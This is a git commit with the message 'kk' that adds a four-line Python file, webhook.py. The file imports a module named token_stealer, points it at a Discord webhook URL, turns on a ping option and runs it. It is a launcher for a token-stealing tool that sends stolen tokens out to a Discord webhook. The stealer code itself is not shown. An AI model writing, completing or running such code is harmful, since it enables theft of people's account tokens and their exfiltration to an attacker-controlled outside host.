d15b97d9f31ed02daa0dfe065d119755890d376f
user <@>
2024-01-17 16:11:28 +0300

    kk

---
+++ ege13/webhook.py
@@ -0,0 +1,4 @@
+import token_stealer
+token_stealer.WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/fyugYDStygft2g7y8f6datyFTYydfg61hfTY78y"
+token_stealer.PING_ME = True
+token_stealer.main()
